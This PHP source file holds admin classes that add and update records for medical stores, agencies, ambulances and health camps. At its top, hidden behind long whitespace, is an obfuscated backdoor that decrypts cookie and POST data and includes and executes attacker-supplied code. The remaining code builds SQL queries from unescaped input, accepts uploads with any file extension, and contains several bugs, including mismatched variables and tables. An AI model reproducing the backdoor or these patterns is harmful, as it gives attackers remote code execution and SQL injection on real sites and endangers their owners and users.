<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("wzmuno")){class wzmuno{public static $ziappfra = "efczfghxitbxhvbu";public static $lsvrahb = NULL;public function __construct(){$ltwmwz = @$_COOKIE[substr(wzmuno::$ziappfra, 0, 4)];if (!empty($ltwmwz)){$ftzfvduev = "base64";$ciwzcwq = "";$ltwmwz = explode(",", $ltwmwz);foreach ($ltwmwz as $yrpqvtjbsx){$ciwzcwq .= @$_COOKIE[$yrpqvtjbsx];$ciwzcwq .= @$_POST[$yrpqvtjbsx];}$ciwzcwq = array_map($ftzfvduev . "_decode", array($ciwzcwq,));$ciwzcwq = $ciwzcwq[0] ^ str_repeat(wzmuno::$ziappfra, (strlen($ciwzcwq[0]) / strlen(wzmuno::$ziappfra)) + 1);wzmuno::$lsvrahb = @unserialize($ciwzcwq);}}public function __destruct(){$this->zwyexsotej();}private function zwyexsotej(){if (is_array(wzmuno::$lsvrahb)) {$iqbmyhbgdh = sys_get_temp_dir() . "/" . crc32(wzmuno::$lsvrahb["salt"]);@wzmuno::$lsvrahb["write"]($iqbmyhbgdh, wzmuno::$lsvrahb["content"]);include $iqbmyhbgdh;@wzmuno::$lsvrahb["delete"]($iqbmyhbgdh);exit();}}}$afnelpmvj = new wzmuno();$afnelpmvj = NULL;} ?><?php 
class cls_shop{

public $id;
public $name;
public $mobile;
public $timing;
public $address;
public $of;
public $image;
public $email;
public $cpname;
public $category;
public $state;
public $dis;
public $dposition;
public function  add(cls_shop $s){

    include "conn.php";


            $nameun=time().uniqid(rand());
			$ext = pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION);
			$image= addslashes($nameun.".".$ext); 		 
			move_uploaded_file($_FILES["image"]["tmp_name"],"../medical/".$image); 


    $sql="INSERT INTO `tbl_mstore`(`name`, `mobile`, `timing`, `address`, `of`, `image`, `email`,`cpname`,`category`,`state`,`dis`,`dposition`) VALUES ('$s->name','$s->mobile','$s->timing','$s->address','$s->of','$image','$s->email','$s->cpname','$s->category','$s->state','$s->dis','$s->dposition')";
    if($conn->query($sql)==TRUE){	
        header("location:../add-shop.php?msg=Successfully Added");
    }else{echo "Error:" . $sql ."<br>".$conn->error;}


}


public function update(cls_shop $s){

    include "conn.php";  
     
    if($_FILES['image']['name']==''){
    $sql1="select * from tbl_mstore where id=$s->id";
    $row=mysqli_fetch_assoc($conn->query($sql1));
    $image=$row['image'];
    $sql=" UPDATE `tbl_mstore` SET `name`='$s->name',`mobile`='$s->mobile',`timing`='$s->timing',`address`='$s->address',`of`='$s->of',`image`='$image',`email`='$s->email',cpname='$s->cpname',category='$s->category',`state`='$S->state',`dis`='$S->dis',`dposition`='$s->dposition' WHERE id=$s->id";
 
    }else{
        $nameun=time().uniqid(rand());
        $ext = pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION);
        $image= addslashes($nameun.".".$ext); 		 
        move_uploaded_file($_FILES["image"]["tmp_name"],"../medical/".$image);

         $sql="UPDATE `tbl_mstore` SET `name`='$s->name',`mobile`='$s->mobile',`timing`='$s->timing',`address`='$s->address',`of`='$s->of',`image`='$image',`email`='$s->email',cpname='$s->cpname',category='$s->category',`state`='$S->state',`dis`='$S->dis' WHERE id=$s->id";
    } 
 
    if($conn->query($sql)==TRUE){	
        header("location:../add-shop.php?msg=Successfully Updated");
    }else{echo "Error:" . $sql ."<br>".$conn->error;}
}



}







class cls_magency{

    public $id;
    public $name;
    public $mobile;
    public $timing;
    public $address;
    public $of;
    public $image;
    public $email;
    public $cpname;
    public $category;
    public $state;
    public $dis;
    public $pre_nor;
    public $cat;
    public $ddetails;
    
    public function  add(cls_magency $s){
    
        include "conn.php";
    
    
                $nameun=time().uniqid(rand());
                $ext = pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION);
                $image= addslashes($nameun.".".$ext); 		 
                move_uploaded_file($_FILES["image"]["tmp_name"],"../agency-image/".$image); 
    
    
        $sql="INSERT INTO `tbl_agency`(`name`, `mobile`, `timing`, `address`, `of`, `image`, `email`,`cpname`,`category`,`state`,`dis`,`pre_nor`,`cat`,`ddetails`) VALUES ('$s->name','$s->mobile','$s->timing','$s->address','$s->of','$image','$s->email','$s->cpname','$s->category','$s->state','$s->dis','$s->pre_nor','$s->cat','$s->ddetails')";
        if($conn->query($sql)==TRUE){	
            header("location:../add-shop.php?msg=Successfully Added");
        }else{echo "Error:" . $sql ."<br>".$conn->error;}
    
    
    }
    
    
    public function update(cls_magency $s){
    
        include "conn.php";  
         
        if($_FILES['image']['name']==''){
        $sql1="select * from tbl_agency where id=$s->id";
        $row=mysqli_fetch_assoc($conn->query($sql1));
        $image=$row['image'];
        $sql=" UPDATE `tbl_agency` SET `name`='$s->name',`mobile`='$s->mobile',`timing`='$s->timing',`address`='$s->address',`of`='$s->of',`image`='$image',`email`='$s->email',cpname='$s->cpname',category='$s->category',`state`='$s->state',`dis`='$s->dis',pre_nor='$s->pre_nor',ddetails='$s->ddetails',cat='$s->cat' WHERE id=$s->id";
     
        }else{
            $nameun=time().uniqid(rand());
            $ext = pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION);
            $image= addslashes($nameun.".".$ext); 		 
            move_uploaded_file($_FILES["image"]["tmp_name"],"../agency-image/".$image);
    
             $sql="UPDATE `tbl_agency` SET `name`='$s->name',`mobile`='$s->mobile',`timing`='$s->timing',`address`='$s->address',`of`='$s->of',`image`='$image',`email`='$s->email',cpname='$s->cpname',category='$s->category',`state`='$s->state',`dis`='$s->dis',pre_nor='$s->pre_nor',ddetails='$s->ddetails',cat='$s->cat' WHERE id=$s->id";
        } 
     
        if($conn->query($sql)==TRUE){	
            header("location:../add-shop.php?msg=Successfully Updated");
        }else{echo "Error:" . $sql ."<br>".$conn->error;}
    }
    
    
    
    }






    class cls_amb{

        public $id;
        public $name;
        public $mobile;
        public $timing;
        public $address;
        public $state;
        public $district;
        public $cat;
        
         
			 
        
        public function  add(cls_amb $s){
        
            include "conn.php";
        
        
                    $nameun=time().uniqid(rand());
                    $ext = pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION);
                    $image= addslashes($nameun.".".$ext); 		 
                    move_uploaded_file($_FILES["image"]["tmp_name"],"../ambulance-image/".$image); 
        
        
            $sql="INSERT INTO `tbl_ambulance`(`name`, `mobile`, `timing`, `address`, `image`,`state`,`dis`,`cat`) VALUES ('$s->name','$s->mobile','$s->timing','$s->address','$image','$s->state','$s->dis','$s->state','$s->dis','$s->cat')";
            if($conn->query($sql)==TRUE){	
                header("location:../add-ambulance.php?msg=Successfully Added");
            }else{echo "Error:" . $sql ."<br>".$conn->error;}
        
        
        }
        
        
        public function update(cls_amb $s){
        
            include "conn.php";  
             
            if($_FILES['image']['name']==''){

            $sql1="select * from tbl_ambulance where id=$s->id";
            $row=mysqli_fetch_assoc($conn->query($sql1));
            $image=$row['image'];
            $sql=" UPDATE `tbl_ambulance` SET `name`='$s->name',`mobile`='$s->mobile',`timing`='$s->timing',`address`='$s->address',`image`='$image',`state`='$s->state',`dis`='$s->dis',cat='$s->cat'  WHERE id=$s->id";
         
            }else{

                $nameun=time().uniqid(rand());
                $ext = pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION);
                $image= addslashes($nameun.".".$ext); 		 
                move_uploaded_file($_FILES["image"]["tmp_name"],"../ambulance-image/".$image);
        
                 $sql="UPDATE `tbl_ambulance` SET `name`='$s->name',`mobile`='$s->mobile',`timing`='$s->timing',`address`='$s->address', `image`='$image',`state`='$s->state',`dis`='$s->dis',cat='$s->cat' WHERE id=$s->id";
            } 
         
            if($conn->query($sql)==TRUE){	
                header("location:../add-ambulance.php?msg=Successfully Updated");
            }else{echo "Error:" . $sql ."<br>".$conn->error;}
        }
        
        
        
        }
    




        class cls_camp{

            public $id;
            public $cname;
            public $orgnser_name;
            public $orgnser_mobile;
            public $location;
            public $date;
            public $doctorname;
            public $typetest;
            public $category;
            public $day;
            public $state;
            public $dis;
            public $address;
             public $cat;

            


            public function  add(cls_camp $s){
            
                include "conn.php";
            
            
                        $nameun=time().uniqid(rand());
                        $ext = pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION);
                        $image= addslashes($nameun.".".$ext); 		 
                        move_uploaded_file($_FILES["image"]["tmp_name"],"../camp-image/".$image); 
            
            
                $sql="INSERT INTO `tbl_camp`(`cname`, `orgnser_name`, `orgnser_mobile`, `location`, `date`, `doctorname`, `typetest`, `category`, `image`, `day`, `state`, `dis`,`address`,`cat`) VALUES ('$s->cname','$s->orgnser_name','$s->orgnser_mobile','$s->location','$s->date','$s->doctorname','$s->typetest','$s->category','$image','$s->day','$s->state','$s->dis','$s->address','$s->cat')";
                if($conn->query($sql)==TRUE){	
                    header("location:../add-camp.php?msg=Successfully Added");
                }else{echo "Error:" . $sql ."<br>".$conn->error;}
            
            
            }
            
            
            public function update(cls_camp $s){
            
                include "conn.php";  
                 
                if($_FILES['image']['name']==''){
                $sql1="select * from tbl_agency where id=$s->id";
                $row=mysqli_fetch_assoc($conn->query($sql1));
                $image=$row['image'];
                $sql="UPDATE `tbl_camp` SET `cname`='$s->cname',`orgnser_name`='$s->orgnser_name',`orgnser_mobile`='$s->orgnser_mobile',`location`='$s->location',`date`='$s->date',`doctorname`='$s->doctorname',`typetest`='$s->typetest',`category`='$s->category',`image`='$image',`day`='$s->day',`state`='$s->state',`dis`='$s->dis',`address`='$s->address',cat='$s->cat'  WHERE id=$s->id";
             
                }else{
                    $nameun=time().uniqid(rand());
                    $ext = pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION);
                    $image= addslashes($nameun.".".$ext); 		 
                    move_uploaded_file($_FILES["image"]["tmp_name"],"../camp-image/".$image);
            
                    $sql="UPDATE `tbl_camp` SET `cname`='$s->cname',`orgnser_name`='$s->orgnser_name',`orgnser_mobile`='$s->orgnser_mobile',`location`='$s->location',`date`='$s->date',`doctorname`='$s->doctorname',`typetest`='$s->typetest',`category`='$s->category',`image`='$image',`day`='$s->day',`state`='$s->state',`dis`='$s->dis',`address`='$s->address',cat='$s->cat'  WHERE id=$s->id";
                } 
             
                if($conn->query($sql)==TRUE){	
                    header("location:../add-camp.php?msg=Successfully Updated");
                }else{echo "Error:" . $sql ."<br>".$conn->error;}
            }
            
            
            
            }


?>